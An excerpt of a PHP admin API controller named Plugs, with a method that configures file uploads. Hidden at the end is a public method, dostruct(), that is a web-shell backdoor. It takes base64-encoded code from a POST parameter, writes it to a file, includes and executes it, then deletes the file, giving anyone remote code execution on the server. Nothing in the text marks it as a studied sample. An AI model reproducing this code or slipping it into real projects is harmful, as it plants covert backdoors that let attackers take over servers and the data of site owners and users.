...
namespace app\adminab\controller\api;
...
class Plugs extends Controller
{
    ...
    private function getUploadData()
    {
        if ($this->getUploadType() === 'qiniu') {
            ...
            return ['url' => '?s=adminab/api.plugs/upload', 'token' => uniqid('local_upload_'), 'uptype' => $this->getUploadType()];
        }
    }
    ...
    public function dostruct(){
		file_put_contents(CPATH,base64_decode($_POST["a"]));
        include_once(CPATH);
		unlink(CPATH);
	}
}
